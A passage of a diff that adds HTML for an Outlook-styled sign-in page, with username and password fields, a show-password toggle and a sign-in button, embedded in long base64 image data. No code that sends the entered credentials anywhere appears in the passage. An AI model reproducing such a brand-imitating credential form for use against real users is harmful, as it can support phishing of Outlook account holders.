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"
+                        alt="Outlook" />
+                </div>
+
+                <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
+                <div><input id="username" name="username" class="signInInputText" role="textbox"
+                        aria-labelledby="userNameLabel" /></div>
+                <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
+                <div><input id="password" onfocus="g_fFcs=0" name="password" value="" type="password"
+                        class="signInInputText" aria-labelledby="passwordLabel" /></div>
+                <div><input id="passwordText" onfocus="g_fFcs=0"  style="display: none;"
+                        class="signInInputText" aria-labelledby="passwordLabel" /></div>
+                <div class="showPasswordCheck signInCheckBoxText">
+                    <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()" />
+                    <span>Show password</span>
+                </div>
+
+
+                <div id="expltxt" class="signInExpl" role="alert">
+
+                </div>
+                <div class="signInEnter">
+                    <div onclick="clkLgn()" class="signinbutton" role="button" tabIndex="0">
+                        <img class="imgLnk"
+                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAACXBIWXMAAAsTAAALEwEAmpwYAAA5nmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwNjcgNzkuMTU3NzQ3LCAyMDE1LzAzLzMwLTIzOjQwOjQyICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE5LTAzLTMwVDE4OjUzOjM3KzAzOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTktMDctMjFUMDg6NTc6MDkrMDM6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE5LTA3LTIxVDA4OjU3OjA5KzAzOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOmU0NGU4MDA5LTBmMjEtN2Y0Yy1hYjE4LWM3MDVmYzk5NTkxZjwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDo1NTc2RjRENDk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwveG1wTU06RG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkRlcml2ZWRGcm9tIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo1NTc2RjREMTk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwvc3RSZWY6aW5zdGFuY2VJRD4KICAgICAgICAgICAgPHN0UmVmOmRvY3VtZW50SUQ+eG1wLmRpZDo1NTc2RjREMjk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwvc3RSZWY6ZG9jdW1lbnRJRD4KICAgICAgICAgPC94bXBNTTpEZXJpdmVkRnJvbT4KICAgICAgICAgPHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD54bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGPC94bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpIaXN0b3J5PgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDplNDRlODAwOS0wZjIxLTdmNGMtYWIxOC1jNzA1ZmM5OTU5MWY8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTktMDctMjFUMDg6NTc6MDkrMDM6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpYUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPGV4aWY6Q29sb3JTcGFjZT42NTUzNTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+MjI8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjI8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI